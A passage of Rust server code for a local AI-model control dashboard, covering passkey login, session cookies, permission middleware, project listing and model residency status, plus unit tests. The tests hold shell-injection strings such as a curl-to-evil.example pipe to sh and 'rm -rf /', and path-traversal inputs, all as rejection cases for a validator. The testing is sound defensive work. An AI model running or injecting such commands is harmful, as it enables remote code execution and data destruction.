const SESSION_TTL_SECS: u64 = 30 * 24 * 3600;
fn sess_path() -> Option<PathBuf> { state_dir().map(|d| d.join("ucc-auth-sessions.json")) }

#[derive(Debug, Clone, Serialize, Deserialize)]
struct SessEntry { token: String, user_id: String, expires_at: u64 }

fn load_auth_sessions() -> Vec<SessEntry> {
    sess_path().and_then(|p| std::fs::read(p).ok()).and_then(|b| serde_json::from_slice(&b).ok()).unwrap_or_default()
}
fn save_auth_sessions(s: &[SessEntry]) {
    if let Some(p) = sess_path() {
        if let Ok(b) = serde_json::to_vec(s) {
            atomic_write_private(&p, &b); // 0600 — holds live rozum_sess bearer tokens
        }
    }
}
fn mint_session(user_id: &str) -> String {
    let token = Uuid::new_v4().simple().to_string();
    let now = crate::share::now_unix();
    let mut s = load_auth_sessions();
    s.retain(|e| e.expires_at > now);
    s.push(SessEntry { token: token.clone(), user_id: user_id.to_string(), expires_at: now + SESSION_TTL_SECS });
    save_auth_sessions(&s);
    token
}
fn session_user(token: &str) -> Option<String> {
    let now = crate::share::now_unix();
    load_auth_sessions().into_iter().find(|e| e.token == token && e.expires_at > now).map(|e| e.user_id)
}
#[allow(dead_code)]
fn valid_session(token: &str) -> bool { session_user(token).is_some() }

/// Parse a `name=value; …` Cookie header into a lookup.
fn cookie(headers: &axum::http::HeaderMap, name: &str) -> Option<String> {
    let h = headers.get(axum::http::header::COOKIE)?.to_str().ok()?;
    h.split(';').find_map(|p| {
        let (k, v) = p.split_once('=')?;
        (k.trim() == name).then(|| v.trim().to_string())
    })
}

/// busi SSO: the `busi_device` cookie must be a paired busi token (membership in ~/.busi/tokens.txt) —
/// exactly busi v2's `isPaired`.
fn busi_authed(headers: &axum::http::HeaderMap) -> bool {
    let Some(tok) = cookie(headers, "busi_device") else { return false };
    if tok.is_empty() { return false; }
    let path = std::env::var_os("HOME").map(|h| PathBuf::from(h).join(".busi/tokens.txt"));
    let Some(path) = path else { return false };
    let Ok(content) = std::fs::read_to_string(path) else { return false };
    content.lines().any(|l| l.trim() == tok)
}

/// Returns the authenticated user_id: "busi-sso" for busi users, actual UUID for webauthn users.
fn authed_user_id(headers: &axum::http::HeaderMap) -> Option<String> {
    if let Some(s) = cookie(headers, "rozum_sess") {
        if let Some(uid) = session_user(&s) { return Some(uid); }
    }
    if busi_authed(headers) { return Some("busi-sso".to_string()); }
    None
}
#[allow(dead_code)]
fn authed(headers: &axum::http::HeaderMap) -> bool { authed_user_id(headers).is_some() }

/// Middleware: 401 unless authenticated. Injects `Extension<String>` (user_id) for downstream use.
async fn require_auth(mut req: axum::extract::Request, next: axum::middleware::Next) -> axum::response::Response {
    use axum::response::IntoResponse;
    match authed_user_id(req.headers()) {
        Some(uid) => { req.extensions_mut().insert(uid); next.run(req).await }
        None => (axum::http::StatusCode::UNAUTHORIZED, axum::Json(serde_json::json!({ "error": "auth required" }))).into_response(),
    }
}

/// Inner middleware for admin-only routes: reads the user_id injected by `require_auth`, checks admin perm.
async fn require_admin(
    axum::extract::Extension(user_id): axum::extract::Extension<String>,
    req: axum::extract::Request,
    next: axum::middleware::Next,
) -> axum::response::Response {
    require_perm(user_id, "admin", req, next).await
}

/// Shared body for the `require_perm_*` middlewares below: 403 unless the user (injected by
/// `require_auth`) holds `perm` (or "admin", which satisfies every permission — see `user_has_perm`).
async fn require_perm(user_id: String, perm: &str, req: axum::extract::Request, next: axum::middleware::Next) -> axum::response::Response {
    use axum::response::IntoResponse;
    if user_has_perm(&user_id, perm) {
        next.run(req).await
    } else {
        (axum::http::StatusCode::FORBIDDEN, axum::Json(serde_json::json!({ "error": format!("{perm} permission required") }))).into_response()
    }
}

/// Gates the dashboard/chat/matrix READ routes that used to be fully public (data-leak fix): status,
/// chat history, and the non-token matrix status/log/cell/live views. The admin-issued view-token
/// routes (`/control/public/matrix*`, `/view/{token}`) remain separately, deliberately, public.
async fn require_perm_read(
    axum::extract::Extension(user_id): axum::extract::Extension<String>,
    req: axum::extract::Request,
    next: axum::middleware::Next,
) -> axum::response::Response {
    require_perm(user_id, "read", req, next).await
}

async fn require_perm_chat(
    axum::extract::Extension(user_id): axum::extract::Extension<String>,
    req: axum::extract::Request,
    next: axum::middleware::Next,
) -> axum::response::Response {
    require_perm(user_id, "chat", req, next).await
}

/// Gates agent/coder/session/gateway launch+control — the routes that can run arbitrary commands or
/// attach a live shell. Previously reachable by ANY authenticated session regardless of role.
async fn require_perm_agents(
    axum::extract::Extension(user_id): axum::extract::Extension<String>,
    req: axum::extract::Request,
    next: axum::middleware::Next,
) -> axum::response::Response {
    require_perm(user_id, "agents", req, next).await
}

async fn require_perm_matrix(
    axum::extract::Extension(user_id): axum::extract::Extension<String>,
    req: axum::extract::Request,
    next: axum::middleware::Next,
) -> axum::response::Response {
    require_perm(user_id, "matrix", req, next).await
}

async fn require_perm_projects(
    axum::extract::Extension(user_id): axum::extract::Extension<String>,
    req: axum::extract::Request,
    next: axum::middleware::Next,
) -> axum::response::Response {
    require_perm(user_id, "projects", req, next).await
}

fn set_cookie(name: &str, value: &str, max_age: u64) -> [(axum::http::HeaderName, String); 1] {
    // SPA + API are same-origin (see `serve`'s doc comment) — SameSite=Lax is enough for normal
    // top-level use and, unlike `None`, stops the cookie riding along on a cross-site POST/fetch
    // (CSRF against `coder_stop_route`/`session_stop_route`, which accept any Content-Type).
    [(axum::http::header::SET_COOKIE,
      format!("{name}={value}; Path=/; Max-Age={max_age}; Secure; HttpOnly; SameSite=Lax"))]
}

async fn auth_status_route(headers: axum::http::HeaderMap) -> axum::response::Response {
    use axum::response::IntoResponse;
    let user_id = authed_user_id(&headers);
    let user_info = user_id.as_deref().and_then(|uid| {
        if uid == "busi-sso" {
            // Keep in sync with the `busi-sso` branch of `user_has_perm` — operator-level, not admin.
            return Some(serde_json::json!({ "id": "busi-sso", "display_name": "busi SSO",
                "permissions": ["read", "chat", "agents", "matrix", "projects"] }));
        }
        let users = load_users();
        let user = users.iter().find(|u| u.id == uid)?;
        let roles = load_roles();
        let mut perms: Vec<String> = user.role_ids.iter()
            .filter_map(|rid| roles.iter().find(|r| r.id == *rid))
            .flat_map(|r| r.permissions.iter().cloned())
            .collect::<std::collections::HashSet<_>>().into_iter().collect();
        perms.sort();
        Some(serde_json::json!({
            "id": user.id, "display_name": user.display_name,
            "roles": user.role_ids, "permissions": perms,
        }))
    });
    axum::Json(serde_json::json!({
        "authed": user_id.is_some(),
        "has_credential": !load_creds().is_empty(),
        "webauthn_ok": webauthn().is_some(),
        "user": user_info,
    })).into_response()
}

#[derive(Deserialize, Default)]
struct RegisterBeginReq {
    #[serde(default)] invite: Option<String>,
    #[serde(default)] display_name: Option<String>,
}

async fn register_begin_route(body: axum::body::Bytes) -> axum::response::Response {
    use axum::response::IntoResponse;
    let req: RegisterBeginReq = if body.is_empty() { Default::default() }
        else { serde_json::from_slice(&body).unwrap_or_default() };
    let users = load_users();
    if !users.is_empty() {
        let Some(ref tok) = req.invite else {
            return json_err(axum::http::StatusCode::FORBIDDEN, "invite required");
        };
        if let Err(e) = check_invite(tok) { return json_err(axum::http::StatusCode::FORBIDDEN, e); }
    } else {
        // First-ever registration (ucc-tofu-bootstrap-token): gated by the bootstrap token instead
        // of being open to whoever reaches the server first.
        let expected = ensure_bootstrap_token();
        if !bootstrap_token_matches(req.invite.as_deref(), expected.as_deref()) {
            return json_err(axum::http::StatusCode::FORBIDDEN, "bootstrap token required");
        }
    }
    let Some(w) = webauthn() else { return json_err(axum::http::StatusCode::INTERNAL_SERVER_ERROR, "webauthn init failed"); };
    let display_name = req.display_name.clone().unwrap_or_else(|| "user".into());
    let user_name = sanitize(&display_name.to_lowercase());
    let exclude: Vec<CredentialID> = load_creds().iter().map(|p| p.cred_id().clone()).collect();
    match w.start_passkey_registration(Uuid::new_v4(), &user_name, &display_name, Some(exclude)) {
        Ok((ccr, state)) => {
            *reg_inflight().lock().unwrap() = Some(RegInflight { state, invite_token: req.invite, display_name });
            axum::Json(ccr).into_response()
        }
        Err(e) => json_err(axum::http::StatusCode::INTERNAL_SERVER_ERROR, &format!("{e:?}")),
    }
}

async fn register_finish_route(axum::Json(reg): axum::Json<RegisterPublicKeyCredential>) -> axum::response::Response {
    use axum::response::IntoResponse;
    let Some(w) = webauthn() else { return json_err(axum::http::StatusCode::INTERNAL_SERVER_ERROR, "webauthn init failed"); };
    let Some(inflight) = reg_inflight().lock().unwrap().take() else {
        return json_err(axum::http::StatusCode::BAD_REQUEST, "no registration in flight");
    };
    match w.finish_passkey_registration(&reg, &inflight.state) {
        Ok(pk) => {
            let cred_hex = cred_id_hex(pk.cred_id());
            let mut c = load_creds(); c.push(pk); save_creds(&c);
            if load_roles().is_empty() { save_roles(&default_roles()); }
            let mut users = load_users();
            if users.is_empty() {
                // First-ever registration — `register_begin_route` already validated the bootstrap
                // token (ucc-tofu-bootstrap-token) before this ceremony was allowed to start.
                // `inflight.invite_token` holds that bootstrap token, not a real stored invite, so
                // it must NOT be looked up via `check_invite` below (that would silently no-op).
                users.push(UccUser {
                    id: Uuid::new_v4().to_string(), display_name: "Admin".into(),
                    role_ids: vec!["admin".into()], passkey_ids: vec![cred_hex],
                    created_at: crate::share::now_unix(), created_by: None,
                });
                save_users(&users);
                consume_bootstrap_token();
            } else if let Some(ref tok) = inflight.invite_token {
                if let Ok(inv) = check_invite(tok) {
                    users.push(UccUser {
                        id: Uuid::new_v4().to_string(), display_name: inflight.display_name,
                        role_ids: vec![inv.role_id.clone()], passkey_ids: vec![cred_hex],
                        created_at: crate::share::now_unix(), created_by: Some(inv.created_by),
                    });
                    save_users(&users);
                    consume_invite(tok);
                }
            } else if let Some(admin) = users.iter_mut().find(|u| u.role_ids.contains(&"admin".to_string())) {
                // Adding a new device to the existing admin account.
                admin.passkey_ids.push(cred_hex);
                save_users(&users);
            }
            axum::Json(serde_json::json!({ "ok": true })).into_response()
        }
        Err(e) => json_err(axum::http::StatusCode::BAD_REQUEST, &format!("{e:?}")),
    }
}

async fn login_begin_route() -> axum::response::Response {
    use axum::response::IntoResponse;
    let Some(w) = webauthn() else { return json_err(axum::http::StatusCode::INTERNAL_SERVER_ERROR, "webauthn init failed"); };
    let creds = load_creds();
    if creds.is_empty() { return json_err(axum::http::StatusCode::BAD_REQUEST, "no passkey enrolled"); }
    match w.start_passkey_authentication(&creds) {
        Ok((rcr, state)) => { *auth_inflight().lock().unwrap() = Some(state); axum::Json(rcr).into_response() }
        Err(e) => json_err(axum::http::StatusCode::INTERNAL_SERVER_ERROR, &format!("{e:?}")),
    }
}

async fn login_finish_route(axum::Json(auth): axum::Json<PublicKeyCredential>) -> axum::response::Response {
    use axum::response::IntoResponse;
    let Some(w) = webauthn() else { return json_err(axum::http::StatusCode::INTERNAL_SERVER_ERROR, "webauthn init failed"); };
    let Some(state) = auth_inflight().lock().unwrap().take() else { return json_err(axum::http::StatusCode::BAD_REQUEST, "no login in flight"); };
    match w.finish_passkey_authentication(&auth, &state) {
        Ok(auth_result) => {
            ensure_rbac_initialized();
            let cred_hex = cred_id_hex(auth_result.cred_id());
            // Reject a credential that passed the ceremony but is not linked to any user (e.g. a
            // deleted user's leftover passkey) — do NOT fall back to a literal "admin" user_id.
            let Some(user) = find_user_by_cred(&cred_hex) else {
                return json_err(axum::http::StatusCode::UNAUTHORIZED, "credential not linked to a user");
            };
            let token = mint_session(&user.id);
            (set_cookie("rozum_sess", &token, SESSION_TTL_SECS),
             axum::Json(serde_json::json!({ "ok": true }))).into_response()
        }
        Err(e) => json_err(axum::http::StatusCode::UNAUTHORIZED, &format!("{e:?}")),
    }
}

/// A coherent snapshot of the models/gateway service.
#[derive(Debug, Clone, Serialize)]
pub struct ControlStatus {
    /// The active shared gateway, or `None` if none is running.
    pub gateway: Option<GatewayStatus>,
    /// Host residency (RAM budget / committed / available / resident set).
    pub residency: ResidencyStatus,
    /// Installed local models (the catalog).
    pub installed: Vec<InstalledBrief>,
    /// Flat, display-ready residency metrics (gateway label + GiB-formatted RAM). An ARRAY so a
    /// declarative table (`remoteTable(st, cols, "residency_metrics")`) renders them identically on
    /// web AND tui — no client-side `computedSignal` (which the tui backend can't recompute).
    pub residency_metrics: Vec<MetricBrief>,
    /// The meeting rooms (read-only, from the meeting daemon's on-disk registry) so the UCC can list
    /// them with a link to each room's web view. Read directly from `rooms.json` to avoid a
    /// rozum-gateway → rozum-meeting crate dependency.
    pub meetings: Vec<MeetingBrief>,
    /// The chat-agents (model-participants) launched through the control API, with liveness — so the
    /// UCC can show a cross-room "running agents" view and stop them.
    pub agents: Vec<AgentBrief>,
    /// The coding-agents (`rozum launch`) launched through the control API, with liveness — so the UCC
    /// can show running coders, tail their logs, and stop them.
    pub coders: Vec<CoderBrief>,
    /// The live interactive terminal sessions (tmux-backed) — so the UCC can list them, open the
    /// xterm.js terminal, and stop them.
    pub sessions: Vec<SessionBrief>,
    /// Known project directories (from rooms.json), for workdir selection in the UCC launch forms.
    pub projects: Vec<ProjectBrief>,
    /// All installed models merged with live residency, sorted by size desc.
    /// Each row carries `stop_label`/`load_spec` for per-row conditional action buttons in the UCC.
    pub models: Vec<UnifiedModelBrief>,
}

#[derive(Debug, Clone, Serialize)]
pub struct GatewayStatus {
    pub model: String,
    pub port: u16,
    pub pid: u32,
    pub n_ctx: u32,
    pub generation: u64,
    pub uptime_secs: u64,
    pub clients: usize,
    pub healthy: bool,
}

#[derive(Debug, Clone, Serialize)]
pub struct ResidencyStatus {
    pub host_budget_bytes: Option<u64>,
    pub committed_bytes: u64,
    pub available_bytes: Option<u64>,
    pub residents: Vec<ResidentBrief>,
}

#[derive(Debug, Clone, Serialize)]
pub struct ResidentBrief {
    pub pid: u32,
    pub model: String,
    pub size_gib: String,
    /// smmr-D: steady-state active footprint (weights + KV, no transient activations) in GiB.
    /// None if no prior run has been measured yet.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub active_peak_gib: Option<String>,
    /// smmr-D: process-wide total peak (active + cache + prefill spike) in GiB.
    #[serde(skip_serializing_if = "Option::is_none")]
    pub total_peak_gib: Option<String>,
}

#[derive(Debug, Clone, Serialize)]
pub struct InstalledBrief {
    pub spec: String,
    pub size_bytes: u64,
    /// GiB-formatted size for direct display in a declarative table column.
    pub size_gib: String,
}

/// One row in the unified models panel — installed catalog merged with live residency.
#[derive(Debug, Clone, Serialize)]
pub struct UnifiedModelBrief {
    pub spec: String,
    pub size_gib: String,
    pub size_bytes: u64,
    /// "выгрузить" when the model is currently resident; "" when not (hides the stop button via CSS).
    pub stop_label: String,
    /// spec value when the model is not loaded (drives the load URL); "" when already resident.
    pub load_spec: String,
}

/// A flat `{metric, value}` pair — a row in the display-ready `residency_metrics` table.
#[derive(Debug, Clone, Serialize)]
pub struct MetricBrief {
    pub metric: String,
    pub value: String,
}

/// A meeting room — its `room` name is the path segment of the meeting web view (`/r/<room>`).
#[derive(Debug, Clone, Serialize)]
pub struct MeetingBrief {
    pub room: String,
}

#[derive(Debug, Clone, Serialize)]
pub struct ProjectBrief {
    pub name: String,
    pub path: String,
}

/// List the meeting rooms from the daemon's on-disk registry (`$XDG_STATE_HOME|~/.local/state` →
/// `rozum/rooms.json`). Read-only, best-effort: a missing/garbled file yields an empty list. Test and
/// worktree rooms (project under `/tmp` or `/.worktrees/`) are filtered out so the dashboard lists the
/// real rooms (global + project).
fn list_meetings() -> Vec<MeetingBrief> {
    let base = std::env::var_os("XDG_STATE_HOME")
        .map(std::path::PathBuf::from)
        .or_else(|| std::env::var_os("HOME").map(|h| std::path::PathBuf::from(h).join(".local/state")));
    let Some(path) = base.map(|b| b.join("rozum/rooms.json")) else {
        return Vec::new();
    };
    let Ok(bytes) = std::fs::read(&path) else { return Vec::new() };
    let Ok(rooms) = serde_json::from_slice::<Vec<serde_json::Value>>(&bytes) else {
        return Vec::new();
    };
    rooms
        .iter()
        .filter_map(|r| {
            let name = r.get("name")?.as_str()?;
            let project = r.get("project").and_then(|p| p.as_str()).unwrap_or("");
            if project.contains("/tmp/") || project.contains("/.worktrees/") {
                return None;
            }
            Some(MeetingBrief { room: name.to_string() })
        })
        .collect()
}

/// List known project directories from `rooms.json` for the workdir picker. Rooms without a
/// project path, and test/worktree paths, are excluded.
fn ucc_config_path() -> std::path::PathBuf {
    std::env::var_os("HOME")
        .map(std::path::PathBuf::from)
        .unwrap_or_default()
        .join(".rozum/ucc/config.json")
}

fn read_projects_dir() -> String {
    std::fs::read(ucc_config_path()).ok()
        .and_then(|b| serde_json::from_slice::<serde_json::Value>(&b).ok())
        .and_then(|v| v.get("projects_dir").and_then(|d| d.as_str()).map(|s| s.to_string()))
        .unwrap_or_else(|| {
            std::env::var_os("HOME")
                .map(|h| std::path::PathBuf::from(h).join("work").to_string_lossy().to_string())
                .unwrap_or_else(|| "/tmp/projects".to_string())
        })
}

fn projects_extra_path() -> std::path::PathBuf {
    std::env::var_os("HOME")
        .map(std::path::PathBuf::from)
        .unwrap_or_default()
        .join(".rozum/ucc/projects.json")
}

async fn config_route() -> axum::response::Response {
    use axum::response::IntoResponse;
    // Public (pre-auth) endpoint — collapse $HOME to `~` so it doesn't leak the absolute home path / OS
    // username to an unauthenticated caller.
    let dir = read_projects_dir();
    let shown = match std::env::var("HOME") {
        Ok(h) if !h.is_empty() && dir.starts_with(&h) => format!("~{}", &dir[h.len()..]),
        _ => dir,
    };
    axum::Json(serde_json::json!({ "projects_dir": shown })).into_response()
}

fn list_projects() -> Vec<ProjectBrief> {
    let mut out: Vec<ProjectBrief> = Vec::new();

    // 1) rooms.json — project rooms from the meeting daemon
    let base = std::env::var_os("XDG_STATE_HOME")
        .map(std::path::PathBuf::from)
        .or_else(|| std::env::var_os("HOME").map(|h| std::path::PathBuf::from(h).join(".local/state")));
    if let Some(path) = base.map(|b| b.join("rozum/rooms.json")) {
        if let Ok(bytes) = std::fs::read(&path) {
            if let Ok(rooms) = serde_json::from_slice::<Vec<serde_json::Value>>(&bytes) {
                for r in &rooms {
                    let Some(name) = r.get("name").and_then(|v| v.as_str()) else { continue };
                    let Some(project) = r.get("project").and_then(|v| v.as_str()) else { continue };
                    if project.is_empty() || project.contains("/tmp/") || project.contains("/.worktrees/") {
                        continue;
                    }
                    if !out.iter().any(|p| p.path == project) {
                        out.push(ProjectBrief { name: name.to_string(), path: project.to_string() });
                    }
                }
            }
        }
    }

    // 2) ~/.rozum/ucc/projects.json — user-added projects via the UCC "создать" button
    if let Ok(bytes) = std::fs::read(projects_extra_path()) {
        if let Ok(extras) = serde_json::from_slice::<Vec<serde_json::Value>>(&bytes) {
            for r in &extras {
                let Some(name) = r.get("name").and_then(|v| v.as_str()) else { continue };
                let Some(path) = r.get("path").and_then(|v| v.as_str()) else { continue };
                if !out.iter().any(|p| p.path == path) {
                    out.push(ProjectBrief { name: name.to_string(), path: path.to_string() });
                }
            }
        }
    }

    out
}

#[derive(serde::Deserialize)]
struct ProjectAddRequest {
    name: String,
}

async fn project_add_route(body: String) -> axum::response::Response {
    use axum::response::IntoResponse;
    let req = match parse_project_add_body(&body) {
        Ok(req) => req,
        Err(e) => return json_err(axum::http::StatusCode::BAD_REQUEST, &e),
    };
    let name = req.name.trim().to_string();
    if name.is_empty() {
        return json_err(axum::http::StatusCode::BAD_REQUEST, "name required");
    }
    if name.contains('/') || name.contains("..") {
        return json_err(axum::http::StatusCode::BAD_REQUEST, "name must not contain path separators");
    }
    let base = read_projects_dir();
    let path = format!("{}/{}", base.trim_end_matches('/'), name);
    let p = std::path::Path::new(&path);
    if !p.exists() {
        if let Err(e) = std::fs::create_dir_all(p) {
            return json_err(axum::http::StatusCode::INTERNAL_SERVER_ERROR, &format!("mkdir: {e}"));
        }
    } else if !p.is_dir() {
        return json_err(axum::http::StatusCode::BAD_REQUEST, "path exists but is not a directory");
    }
    let extra = projects_extra_path();
    let mut projects: Vec<serde_json::Value> = if extra.exists() {
        std::fs::read(&extra).ok()
            .and_then(|b| serde_json::from_slice(&b).ok())
            .unwrap_or_default()
    } else {
        Vec::new()
    };
    if !projects.iter().any(|e| e.get("path").and_then(|v| v.as_str()) == Some(path.as_str())) {
        projects.push(serde_json::json!({"name": name, "path": path}));
        if let Some(parent) = extra.parent() { let _ = std::fs::create_dir_all(parent); }
        if let Err(e) = std::fs::write(&extra, serde_json::to_vec(&projects).unwrap_or_default()) {
            return json_err(axum::http::StatusCode::INTERNAL_SERVER_ERROR, &format!("write: {e}"));
        }
    }
    axum::Json(serde_json::json!({"ok": true})).into_response()
}

/// Format a byte count as a one-decimal GiB string (e.g. `"25.1 GiB"`).
fn fmt_gib(bytes: u64) -> String {
    format!("{:.1} GiB", bytes as f64 / 1_073_741_824.0)
}

/// Aggregate the live models/gateway control status — the active gateway (if any), the host residency
/// ledger, and the installed catalog. Read-only; never loads a model or invokes an engine.
pub async fn status() -> ControlStatus {
    use crate::share;
    let gateway = match share::read_active() {
        Some(a) => Some(GatewayStatus {
            healthy: share::health_ok(a.port).await,
            uptime_secs: share::now_unix().saturating_sub(a.started_at),
            clients: share::live_lease_count(share::LEASE_FRESH_SECS),
            model: a.model,
            port: a.port,
            pid: a.pid,
            n_ctx: a.n_ctx,
            generation: a.generation,
        }),
        None => None,
    };
    let installed_catalog = rozum_models::models::scan_all_installed();
    let residency = ResidencyStatus {
        host_budget_bytes: share::host_ram_budget_bytes(),
        committed_bytes: share::committed_by_others_bytes(0), // skip nothing → the whole ledger
        available_bytes: share::available_ram_for_admission(),
        residents: share::list_residents()
            .into_iter()
            .map(|(pid, model)| {
                let size_gib = installed_catalog
                    .iter()
                    .find(|m| m.spec == model)
                    .map(|m| fmt_gib(m.size_bytes))
                    .unwrap_or_default();
                let active_peak_gib = rozum_core::footprint::cached_active_peak(&model).map(fmt_gib);
                let total_peak_gib = rozum_core::footprint::cached_peak(&model).map(fmt_gib);
                ResidentBrief { pid, model, size_gib, active_peak_gib, total_peak_gib }
            })
            .collect(),
    };
    let installed = installed_catalog
        .iter()
        .map(|m| InstalledBrief { size_gib: fmt_gib(m.size_bytes), spec: m.spec.clone(), size_bytes: m.size_bytes })
        .collect();
    let residency_metrics = vec![
        MetricBrief {
            metric: "gateway".into(),
            value: gateway.as_ref().map(|g| g.model.clone()).unwrap_or_else(|| "none running".into()),
        },
        MetricBrief {
            metric: "available".into(),
            value: residency.available_bytes.map(fmt_gib).unwrap_or_else(|| "—".into()),
        },
        MetricBrief {
            metric: "host budget".into(),
            value: residency.host_budget_bytes.map(fmt_gib).unwrap_or_else(|| "—".into()),
        },
        MetricBrief { metric: "committed".into(), value: fmt_gib(residency.committed_bytes) },
        MetricBrief { metric: "residents".into(), value: residency.residents.len().to_string() },
    ];
    let meetings = list_meetings();
    let agents = live_agents();
    let coders = live_coders();
    let sessions = live_sessions();
    let projects = list_projects();
    let resident_specs: std::collections::HashSet<&str> =
        residency.residents.iter().map(|r| r.model.as_str()).collect();
    let mut models: Vec<UnifiedModelBrief> = installed_catalog.iter().map(|m| {
        let loaded = resident_specs.contains(m.spec.as_str());
        UnifiedModelBrief {
            spec: m.spec.clone(),
            size_gib: fmt_gib(m.size_bytes),
            size_bytes: m.size_bytes,
            stop_label: if loaded { "выгрузить".to_string() } else { String::new() },
            load_spec: if loaded { String::new() } else { m.spec.clone() },
        }
    }).collect();
    models.sort_by(|a, b| b.size_bytes.cmp(&a.size_bytes));
    ControlStatus { gateway, residency, installed, residency_metrics, meetings, agents, coders, sessions, projects, models }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn status_snapshots_and_serializes() {
        // Env-independent: it aggregates a coherent snapshot (residency + catalog) without panicking,
        // and serializes to the JSON contract the HTTP/UCC consumer reads.
        let s = status().await;
        let json = serde_json::to_string(&s).unwrap();
        assert!(json.contains("\"residency\""));
        assert!(json.contains("\"installed\""));
        // residents in the ledger each have a non-empty model name.
        assert!(s.residency.residents.iter().all(|r| !r.model.is_empty()));
    }

    #[test]
    fn shell_safe_accepts_realistic_model_and_agent_names() {
        assert!(shell_safe("claude"));
        assert!(shell_safe("codex"));
        assert!(shell_safe("mlx-community/Qwen2.5-Coder-7B-Instruct-4bit"));
        assert!(shell_safe("org/repo:tag+build"));
    }

    #[test]
    fn shell_safe_rejects_shell_metacharacters() {
        // These are exactly the shapes that would break out of the tmux `new-session` shell-command
        // string built in `session_launch_route` (see ucc-session-launch-injection).
        assert!(!shell_safe("codex; curl evil.example | sh"));
        assert!(!shell_safe("codex `id`"));
        assert!(!shell_safe("codex $(id)"));
        assert!(!shell_safe("codex && rm -rf /"));
        assert!(!shell_safe("codex\nrm -rf /"));
        assert!(!shell_safe("has space"));
        assert!(!shell_safe(""));
    }

    #[test]
    fn ucc_form_body_json_parses_session_launch_without_content_type() {
        let req: SessionLaunchReq = parse_action_json(
            r#"{"agent":"claude","model":"mlx-community:Qwen3.6-35B-A3B-4bit","workdir":"/tmp","prompt":""}"#,
        )
        .unwrap();
        assert_eq!(req.agent, "claude");
        assert_eq!(req.model, "mlx-community:Qwen3.6-35B-A3B-4bit");
        assert_eq!(req.workdir, "/tmp");
        assert_eq!(req.prompt, "");
    }

    #[test]
    fn ucc_form_body_json_parses_defaulted_agent_launch() {
        let req: AgentLaunchReq =
            parse_action_json(r#"{"model":"m","room":"rozum","persona":"brief"}"#).unwrap();
        assert_eq!(req.model, "m");
        assert_eq!(req.room, "rozum");
        assert_eq!(req.policy, "mention");
        assert_eq!(req.persona, "brief");
    }

    #[test]
    fn ucc_stop_id_accepts_json_form_and_legacy_plain_body() {
        assert_eq!(parse_id_body(r#"{"id":"claude-123"}"#).unwrap(), "claude-123");
        assert_eq!(parse_id_body("id=claude-123").unwrap(), "claude-123");
        assert_eq!(parse_id_body("claude-123").unwrap(), "claude-123");
        assert!(parse_id_body(r#"{"missing":"id"}"#).is_err());
        assert!(parse_id_body("").is_err());
    }

    #[test]
    fn ucc_project_add_accepts_json_form_and_plain_body() {
        assert_eq!(parse_project_add_body(r#"{"name":"demo"}"#).unwrap().name, "demo");
        assert_eq!(parse_project_add_body("name=demo").unwrap().name, "demo");
        assert_eq!(parse_project_add_body("demo").unwrap().name, "demo");
        assert!(parse_project_add_body(r#"{"missing":"name"}"#).is_err());
        assert!(parse_project_add_body("").is_err());
    }

    #[test]
    fn busi_sso_gets_operator_perms_not_admin() {
        // Regression guard for ucc-busi-sso-scope: busi pairing must NOT satisfy the "admin"
        // permission (previously `user_has_perm` returned true unconditionally for busi-sso).
        assert!(user_has_perm("busi-sso", "read"));
        assert!(user_has_perm("busi-sso", "chat"));
        assert!(user_has_perm("busi-sso", "agents"));
        assert!(user_has_perm("busi-sso", "matrix"));
        assert!(user_has_perm("busi-sso", "projects"));
        assert!(!user_has_perm("busi-sso", "admin"));
    }

    #[test]
    fn bootstrap_token_matches_requires_exact_equal_and_both_present() {
        // Regression guard for ucc-tofu-bootstrap-token: the first registration (no users, no
        // invite system to consult yet) must require the bootstrap token, not silently pass when
        // either side is absent.
        assert!(bootstrap_token_matches(Some("abc"), Some("abc")));
        assert!(!bootstrap_token_matches(Some("abc"), Some("xyz")));
        assert!(!bootstrap_token_matches(None, Some("abc")));
        assert!(!bootstrap_token_matches(Some("abc"), None));
        assert!(!bootstrap_token_matches(None, None));
    }

    #[test]
    fn safe_path_seg_rejects_traversal() {
        // Regression guard for the matrix-cell path-traversal fix: a single path segment must carry no
        // separator, `..`, `.`, or NUL, so a crafted stamp/agent/task can't walk outside the bench
        // results dir (arbitrary file read + a dir-existence oracle otherwise).
        assert!(safe_path_seg("1783166880"));
        assert!(safe_path_seg("claude"));
        assert!(safe_path_seg("task-01"));
        assert!(!safe_path_seg(".."));
        assert!(!safe_path_seg("."));
        assert!(!safe_path_seg(""));
        assert!(!safe_path_seg("../../etc"));
        assert!(!safe_path_seg("a/b"));
        assert!(!safe_path_seg("a\\b"));
        assert!(!safe_path_seg("a\0b"));
    }

    #[test]
    fn same_site_get_rejects_only_cross_site() {
        // Regression guard for the CSRF-on-GET fix: reject a cross-site navigation, allow the SPA's own
        // same-origin anchors, a typed URL (`none`), and non-browser clients (absent header).
        use axum::http::HeaderMap;
        let hm = |v: &str| { let mut h = HeaderMap::new(); h.insert("sec-fetch-site", v.parse().unwrap()); h };
        assert!(same_site_get(&hm("same-origin")));
        assert!(same_site_get(&hm("same-site")));
        assert!(same_site_get(&hm("none")));
        assert!(!same_site_get(&hm("cross-site")));
        assert!(same_site_get(&HeaderMap::new()));
    }
}
